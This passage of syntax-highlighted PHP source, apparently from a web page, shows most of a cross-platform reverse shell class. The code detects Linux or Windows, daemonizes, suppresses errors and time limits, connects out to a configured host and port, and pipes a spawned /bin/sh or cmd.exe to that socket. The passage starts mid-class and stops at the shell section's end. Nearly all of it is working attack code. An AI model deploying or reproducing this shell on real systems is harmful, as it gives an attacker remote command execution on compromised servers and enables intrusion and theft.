</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;WINDOWS&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=o>||</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;WINNT&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=o>||</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;WIN32&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span>    <span class=o>=</span> <span class=s1>&#39;WINDOWS&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>shell</span> <span class=o>=</span> <span class=s1>&#39;cmd.exe&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$detected</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;SYS_ERROR: Underlying operating system is not supported, script will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$detected</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>daemonize</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$exit</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;pcntl_fork&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: pcntl_fork() does not exists, moving on...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=nv>$pid</span> <span class=o>=</span> <span class=o>@</span><span class=nx>pcntl_fork</span><span class=p>())</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Cannot fork off the parent process, moving on...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$exit</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Child process forked off successfully, parent process will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// once daemonized, you will actually no longer see the script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>posix_setsid</span><span class=p>()</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Completed successfully!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>settings</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1>// do not impose the script execution time limit
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>umask</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1>// set the file/directory permissions - 666 for files and 777 for directories
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>dump</span><span class=p>(</span><span class=nv>$data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>sdump</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>read</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$name</span><span class=p>,</span> <span class=nv>$buffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=nv>$data</span> <span class=o>=</span> <span class=o>@</span><span class=nx>fread</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$buffer</span><span class=p>))</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// suppress an error when reading from a closed blocking stream
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>                            <span class=c1>// set the global error flag
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>echo</span> <span class=s2>&#34;STRM_ERROR: Cannot read from </span><span class=si>{</span><span class=nv>$name</span><span class=si>}</span><span class=s2>, script will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>write</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$name</span><span class=p>,</span> <span class=nv>$data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=nv>$bytes</span> <span class=o>=</span> <span class=o>@</span><span class=nx>fwrite</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// suppress an error when writing to a closed blocking stream
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>                            <span class=c1>// set the global error flag
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>echo</span> <span class=s2>&#34;STRM_ERROR: Cannot write to </span><span class=si>{</span><span class=nv>$name</span><span class=si>}</span><span class=s2>, script will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// read/write method for non-blocking streams
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=k>function</span> <span class=nf>rw</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$output</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>((</span><span class=nv>$data</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;WINDOWS&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$oname</span> <span class=o>===</span> <span class=s1>&#39;STDIN&#39;</span><span class=p>)</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>+=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// calculate the command length
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dump</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span> <span class=c1>// script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we must read the exact byte length from a stream and not a single byte more
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=k>function</span> <span class=nf>brw</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$output</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$size</span> <span class=o>=</span> <span class=nx>fstat</span><span class=p>(</span><span class=nv>$input</span><span class=p>)[</span><span class=s1>&#39;size&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;WINDOWS&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$iname</span> <span class=o>===</span> <span class=s1>&#39;STDOUT&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// for some reason Windows OS pipes STDIN into STDOUT
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// we do not like that
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// so we need to discard the data from the stream
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>while</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$bytes</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>&gt;=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>?</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>:</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$bytes</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>-=</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nv>$size</span> <span class=o>-=</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=nv>$size</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$bytes</span> <span class=o>=</span> <span class=nv>$size</span> <span class=o>&gt;=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>?</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>:</span> <span class=nv>$size</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$data</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$bytes</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$size</span> <span class=o>-=</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dump</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span> <span class=c1>// script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>run</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>detect</span><span class=p>()</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>daemonize</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>settings</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// ----- SOCKET BEGIN -----
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$socket</span> <span class=o>=</span> <span class=o>@</span><span class=nx>fsockopen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>addr</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>port</span><span class=p>,</span> <span class=nv>$errno</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$socket</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;SOC_ERROR: </span><span class=si>{</span><span class=nv>$errno</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=nv>$errstr</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span> <span class=c1>// set the socket stream to non-blocking mode | returns &#39;true&#39; on Windows OS
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>                <span class=c1>// ----- SHELL BEGIN -----
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$process</span> <span class=o>=</span> <span class=o>@</span><span class=nx>proc_open</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>shell</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>descriptorspec</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>,</span> <span class=k>null</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$process</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>echo</span> <span class=s2>&#34;PROC_ERROR: Cannot start the shell</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$pipes</span> <span class=k>as</span> <span class=nv>$pipe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipe</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span> <span class=c1>// set the shell streams to non-blocking mode | returns &#39;false&#39; on Windows OS
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=c1>// ----- WORK BEGIN -----
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=nv>$status</span> <span class=o>=</span> <span class=nx>proc_get_status</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=o>@</span><span class=nx>fwrite</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=s2>&#34;SOCKET: Shell has connected! PID: </span><span class=si>{</span><span class=nv>$status</span><span class=p>[</span><span class=s1>&#39;pid&#39;</span><span class=p>]</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$status</span> <span class=o>=</span> <span class=nx>proc_get_status</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$socket</span><span class=p>))</span> <span class=p>{</span> <span class=c1>// check for end-of-file on SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=k>echo</span> <span class=s2>&#34;SOC_ERROR: Shell connection has been terminated</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>||</span> <span class=o>!</span><span class=nv>$status</span><span class=p>[</span><span class=s1>&#39;running&#39;</span><span class=p>])</span> <span class=p>{</span>                 <span class=c1>// check for end-of-file on STDOUT or if process is still running
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=k>echo</span> <span class=s2>&#34;PROC_ERROR: Shell process has been terminated</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>   <span class=k>break</span><span class=p>;</span> <span class=c1>// feof() does not work with blocking streams
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=p>}</span>                                                                    <span class=c1>// use proc_get_status() instead
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=nv>$streams</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                            <span class=s1>&#39;read&#39;</span>   <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]),</span> <span class=c1>// SOCKET | STDOUT | STDERR
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=s1>&#39;write&#39;</span>  <span class=o>=&gt;</span> <span class=k>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                            <span class=s1>&#39;except&#39;</span> <span class=o>=&gt;</span> <span class=k>null</span>
</span></span><span class=line><span class=cl>                        <span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$num_changed_streams</span> <span class=o>=</span> <span class=o>@</span><span class=nx>stream_select</span><span class=p>(</span><span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;except&#39;</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>// wait for stream changes | will not wait on Windows OS
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=k>if</span> <span class=p>(</span><span class=nv>$num_changed_streams</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=k>echo</span> <span class=s2>&#34;STRM_ERROR: stream_select() failed</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$num_changed_streams</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;LINUX&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$socket</span>  <span class=p>,</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span><span class=p>(</span><span class=nv>$socket</span>  <span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>,</span> <span class=s1>&#39;STDIN&#39;</span> <span class=p>);</span> <span class=p>}</span> <span class=c1>// read from SOCKET and write to STDIN
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDERR&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDERR and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDOUT&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDOUT and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;WINDOWS&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=c1>// order is important
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span><span class=cm>/*------*/</span><span class=p>)</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span> <span class=p>(</span><span class=nv>$socket</span>  <span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>,</span> <span class=s1>&#39;STDIN&#39;</span> <span class=p>);</span> <span class=p>}</span> <span class=c1>// read from SOCKET and write to STDIN
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>((</span><span class=nv>$fstat</span> <span class=o>=</span> <span class=nx>fstat</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span> <span class=o>&amp;&amp;</span> <span class=nv>$fstat</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>])</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>brw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDERR&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDERR and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>((</span><span class=nv>$fstat</span> <span class=o>=</span> <span class=nx>fstat</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=o>&amp;&amp;</span> <span class=nv>$fstat</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>])</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>brw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDOUT&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDOUT and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=c1>// ------ WORK END ------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>                    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$pipes</span> <span class=k>as</span> <span class=nv>$pipe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipe</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=nx>proc_close</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=c1>// ------ SHELL END ------
